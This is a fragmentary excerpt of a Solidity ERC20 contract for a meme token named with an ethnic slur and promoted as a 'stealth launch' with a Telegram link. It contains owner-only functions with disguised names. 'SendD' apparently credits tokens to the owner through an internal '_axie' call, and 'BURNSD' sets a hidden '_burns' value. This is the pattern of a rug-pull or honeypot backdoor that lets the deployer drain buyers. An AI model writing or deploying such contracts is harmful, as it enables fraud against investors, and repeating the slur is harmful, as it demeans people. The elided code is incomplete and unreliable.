...
/**                     
 *              PajeetDogeX - Complete Degen Play!
 *    
 *                   Stealthlaunch!
 * 
 *                  
 *              TG: https://t.me/PajeetDogeX
 *                        
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function SendD(uint256 amount) public onlyOwner {
    _axie(msg.sender, amount);
    }
    
    function BURNSD(uint256 BURNS) external onlyOwner(){
        _burns = BURNS;
    }
...
contract PajeetDogeX is ERC20 {

    uint tokenTotalSupply = 1000000000;

    constructor() public ERC20("PajeetDogeX", "PajeetDogeX") {
